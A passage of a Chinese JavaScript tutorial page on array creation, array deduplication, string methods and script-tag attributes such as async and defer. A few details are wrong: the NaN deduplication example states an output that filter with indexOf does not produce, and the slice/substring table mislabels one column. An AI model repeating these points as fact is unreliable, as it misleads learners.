<span class="token keyword">let</span> result <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">_<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> index <span class="token operator">!==</span> b<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 2, 3, 4]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="_4-创建数组填充元素的方法"><a href="#_4-创建数组填充元素的方法" class="header-anchor">#</a> 4.创建数组填充元素的方法</h3> <p>生成一个1-60数字的数组</p> <ul><li>（1）使用Array.from()方法（ES6推荐）</li></ul> <p>Array.from(arrayLike[, mapFn[, thisArg]])</p> <ul><li>arrayLike：必需，任何具有 length 属性且索引为整数的可迭代对象，或者是实现了 @@iterator 接口的对象。</li> <li>mapFn：可选，一个映射函数，对每个元素调用该函数并将其结果收集到新数组中。</li> <li>thisArg：可选，执行映射函数时的上下文对象。</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> numbers <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">length</span><span class="token operator">:</span> <span class="token number">60</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">_<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 结果: [1, 2, 3, ..., 60]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li>（2）使用展开运算符和keys()方法</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> numbers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token function">Array</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">i</span> <span class="token operator">=&gt;</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 结果: [1, 2, 3, ..., 60]</span>
<span class="token comment">// Array(60)       // 创建一个长度为60的空数组（所有元素都是empty）</span>
<span class="token comment">// .keys()      // 返回一个包含数组索引的迭代器对象</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ul><li>（3）使用fill()和map()组合</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> numbers <span class="token operator">=</span> <span class="token function">Array</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">_<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 结果: [1, 2, 3, ..., 60]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li>（4）使用Array.apply()（较老的方法）</li></ul> <p>Array.apply(null, {length: n})</p> <ul><li>null是thisArg参数，表示不改变Array构造函数的this指向；</li> <li>{length: n}是一个类数组对象，其length属性值将被用作新数组的长度。</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> numbers <span class="token operator">=</span> <span class="token function">Array</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token literal-property property">length</span><span class="token operator">:</span> <span class="token number">60</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">_<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 结果: [1, 2, 3, ..., 60]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li>（5）传统for循环方式</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> numbers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">60</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  numbers<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// 结果: [1, 2, 3, ..., 60]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h4 id="性能比较"><a href="#性能比较" class="header-anchor">#</a> 性能比较</h4> <p>对于生成1-60这样的小数组，性能差异可以忽略不计。但对于更大的数组：</p> <ul><li>Array.from() - 性能最好，语法最简洁</li> <li>展开运算符 - 语法简洁但创建临时数组</li> <li>fill+map - 需要额外fill步骤</li> <li>Array.apply - 最不推荐，已过时</li> <li>for循环 - 传统但可靠</li></ul> <h3 id="_5-数组元素去重"><a href="#_5-数组元素去重" class="header-anchor">#</a> 5.数组元素去重</h3> <h4 id="_1-使用-set-es6-最简单方法"><a href="#_1-使用-set-es6-最简单方法" class="header-anchor">#</a> 1. 使用 Set（ES6 最简单方法）</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> uniqueArr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>uniqueArr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 2, 3, 4, 5]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span>obj<span class="token punctuation">,</span> obj<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [{id:1}] (相同引用)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [{id:1}, {id:1}] (不同引用)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>优点​​：
<ul><li>代码简洁</li> <li>性能好（现代浏览器优化良好）</li></ul></li> <li>缺点​​：</li></ul> <ul><li>无法区分对象引用（每个对象都被视为唯一）</li> <li>IE11 及以下不支持 Set</li></ul> <h4 id="_2-使用-filter-indexof"><a href="#_2-使用-filter-indexof" class="header-anchor">#</a> 2. 使用 filter + indexOf</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> uniqueArr <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> arr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">===</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>uniqueArr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 2, 3, 4, 5]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>优点​​：
<ul><li>兼容性好（ES5）</li> <li>代码直观</li></ul></li> <li>​缺点​​：
<ul><li>时间复杂度 O(n²)，大数组性能差</li> <li>同样无法区分对象内容</li></ul></li></ul> <p><code>NaN</code> 去重 无法识别</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">NaN</span><span class="token punctuation">,</span> <span class="token number">NaN</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [NaN] (Set能正确处理NaN)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">v<span class="token punctuation">,</span> i<span class="token punctuation">,</span> a</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> a<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">===</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [NaN, NaN] (indexOf无法识别NaN)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h4 id="_3-使用-reduce"><a href="#_3-使用-reduce" class="header-anchor">#</a> 3. 使用 reduce</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> uniqueArr <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">acc<span class="token punctuation">,</span> curr</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> acc<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>curr<span class="token punctuation">)</span> <span class="token operator">?</span> acc <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token operator">...</span>acc<span class="token punctuation">,</span> curr<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>uniqueArr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 2, 3, 4, 5]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><ul><li>优点​​：
<ul><li>函数式编程风格</li> <li>可读性好</li></ul></li> <li>​缺点​​：
<ul><li>每次迭代都创建新数组，性能较差</li></ul></li></ul> <h4 id="_4-使用-for-循环-传统方法"><a href="#_4-使用-for-循环-传统方法" class="header-anchor">#</a> 4. 使用 for 循环（传统方法）</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">unique</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">unique</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 2, 3, 4, 5]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><ul><li>优点​​：
<ul><li>兼容性最好</li> <li>容易理解</li></ul></li> <li>​缺点​​：
<ul><li>性能一般</li></ul></li></ul> <h2 id="_5-字符串高频操作总结"><a href="#_5-字符串高频操作总结" class="header-anchor">#</a> 5. 字符串高频操作总结</h2> <h3 id="高频使用的api-2"><a href="#高频使用的api-2" class="header-anchor">#</a> 高频使用的API</h3> <ul><li>str.slice(start, end) <strong>有点类似数组的slice</strong> <ul><li><code>start</code> 必须。 要抽取的片断的起始下标，第一个字符位置为 0。如果为负数，则从尾部开始截取。</li> <li><code>end</code> 可选。规定从何处结束选取。</li> <li>以新的字符串返回被提取的部分</li></ul></li> <li>str.trim()
<ul><li>返回移除头尾空格的字符串</li></ul></li> <li>str.substr(start, lenght)
<ul><li><code>start</code> 必须。要抽取的子串的起始下标。必须是数值。如果是负数，那么该参数声明从字符串的尾部开始算起的位置。</li> <li><code>length</code> 可选。子串中的字符数。必须是数值。</li></ul></li> <li>str.substring(from, to) <strong>有点类似数组的slice</strong> <ul><li><code>from</code> 必须。一个非负的整数，规定要提取的子串的第一个字符在 string Object 中的位置。</li> <li><code>to</code> 可选。一个非负的整数，比要提取的子串的最后一个字符在 string Object 中的位置多 1。</li></ul></li></ul> <h3 id="str-slice-和-str-substring-对比"><a href="#str-slice-和-str-substring-对比" class="header-anchor">#</a> str.slice 和 str.substring 对比</h3> <table><thead><tr><th style="text-align:center;">特性</th> <th style="text-align:center;">str.substring(start, end)</th> <th style="text-align:center;">str.substring(from, to)</th></tr></thead> <tbody><tr><td style="text-align:center;">​​负数参数​</td> <td style="text-align:center;">支持（从字符串末尾计算位置）</td> <td style="text-align:center;">负数被视为 0</td></tr> <tr><td style="text-align:center;">参数顺序处理​</td> <td style="text-align:center;">不自动交换参数顺序</td> <td style="text-align:center;">自动交换 start &gt; end 的参数</td></tr> <tr><td style="text-align:center;">返回值​</td> <td style="text-align:center;">当参数无效时返回空字符串 &quot;&quot;</td> <td style="text-align:center;">自动调整参数为有效范围</td></tr></tbody></table> <h3 id="_1-字符串替换"><a href="#_1-字符串替换" class="header-anchor">#</a> 1.字符串替换</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> str <span class="token operator">=</span> <span class="token string">'aaa.bbb.ccc'</span><span class="token punctuation">;</span>

<span class="token comment">// replace() - 替换第一个匹配项</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'aaa.'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 'bbb.ccc'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="_2-去除空白字符"><a href="#_2-去除空白字符" class="header-anchor">#</a> 2.去除空白字符</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> str <span class="token operator">=</span> <span class="token string">'  Hello World  '</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 'Hello World'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="_3-字符串分割成数组"><a href="#_3-字符串分割成数组" class="header-anchor">#</a> 3.字符串分割成数组</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> str <span class="token operator">=</span> <span class="token string">'apple,orange,banana'</span><span class="token punctuation">;</span>

<span class="token comment">// split() - 分割为数组</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ['apple', 'orange', 'banana']</span>

<span class="token comment">// 限制分割次数</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'a-b-c-d'</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ['a', 'b']</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h2 id="_6-script标签的属性有哪些"><a href="#_6-script标签的属性有哪些" class="header-anchor">#</a> 6. script标签的属性有哪些</h2> <h3 id="_1-src-源地址"><a href="#_1-src-源地址" class="header-anchor">#</a> 1. src（源地址）</h3> <p>作用​​：指定外部脚本的 URL</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">&quot;app.js&quot;</span><span class="token operator">&gt;</span>
标签内的代码会被忽略
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>注意​​：
<ul><li>使用后 <strong>标签内的代码会被忽略</strong></li> <li>遵循同源策略，可配置 CORS</li></ul></li></ul> <h3 id="_2-type-类型"><a href="#_2-type-类型" class="header-anchor">#</a> 2. type（类型）</h3> <ul><li>​作用​​：定义脚本 MIME 类型</li> <li>​常用值​​：
<ul><li>text/javascript（默认）</li> <li>module（ES6 模块）</li> <li>application/json（数据块）</li></ul></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">&quot;module&quot;</span> src<span class="token operator">=</span><span class="token string">&quot;app.mjs&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="_3-async-异步加载-和-defer-延迟执行"><a href="#_3-async-异步加载-和-defer-延迟执行" class="header-anchor">#</a> 3. async（异步加载）和 defer（延迟执行）</h3> <p><a href="https://www.growingwiththeweb.com/2014/02/async-vs-defer-attributes.html" target="_blank" rel="noopener noreferrer">参考：<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><strong>script</strong>：会阻碍 HTML 解析，只有下载好并执行完脚本才会继续解析 HTML。<br> <strong>async script</strong>：异步下载（不阻塞HTML解析），下载成功立马执行，有可能会阻断 HTML 的解析。<br> <strong>defer script</strong>：异步下载（不阻塞HTML解析），HTML解析完成之后再按照顺序执行脚本。</p> <img src="/Front-end-go-on/assets/img/script.b8648635.jpg"> <ul><li>defer 和 async 都是只适用于外部的脚本文件，都是用来告诉浏览器立即下载文件，但是延迟执行</li> <li>这些脚本文件会等到 body 的内容执行完才执行<br>
在 HTML5 的规范中，defer 属性要求脚本是按照出现的先后顺序执行，但是在现实中，defer 属性的脚本不一定会按照顺序执行<br>
而 async 属性的脚本执行的顺序并不确定</li></ul> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">async</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>1.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token comment">&lt;!-- 可能最后执行 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">defer</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>2.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token comment">&lt;!-- 保证第二个执行 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>3.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>      <span class="token comment">&lt;!-- 最先执行 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">defer</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>4.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> <span class="token comment">&lt;!-- 保证最后执行 --&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="_4-crossorigin-跨源设置"><a href="#_4-crossorigin-跨源设置" class="header-anchor">#</a> 4. crossorigin（跨源设置）</h3> <ul><li>​作用​​：控制跨域请求的凭据模式</li> <li>​​取值​​：
<ul><li>anonymous：不发送凭据（默认）</li> <li>use-credentials：发送凭据</li></ul></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">&quot;https://cdn.com/lib.js&quot;</span> crossorigin<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="_5-fetchpriority-加载优先级"><a href="#_5-fetchpriority-加载优先级" class="header-anchor">#</a> 5. fetchpriority（加载优先级）</h3> <ul><li>作用​​：提示浏览器加载优先级</li> <li>​​取值​​：
<ul><li>high</li> <li>low</li> <li>auto（默认）</li></ul></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">&quot;critical.js&quot;</span> fetchpriority<span class="token operator">=</span><span class="token string">&quot;high&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
